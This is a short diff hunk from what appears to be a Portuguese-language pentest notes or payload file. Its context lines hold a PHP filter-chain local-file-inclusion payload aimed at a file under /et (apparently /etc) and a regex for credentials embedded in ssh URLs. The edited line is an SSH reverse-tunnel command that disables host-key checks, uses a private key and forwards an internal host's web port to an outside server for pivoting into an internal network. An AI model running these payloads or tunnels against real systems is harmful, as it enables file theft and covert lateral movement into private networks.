@@ -54,4 +54,4 @@ php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///et
 /ssh:\/\/.*:.*@.*\.com/ NOT "git"</br>
 
 <h1>Log ssh pivoting rota interna </h1>
-ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./id_rsa -R 8888:10.0.1.2:80 -N teste@103.106.0.2
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./id_rsa -R 8888:10.0.1.2:80 -N teste@103.106.0.2 &
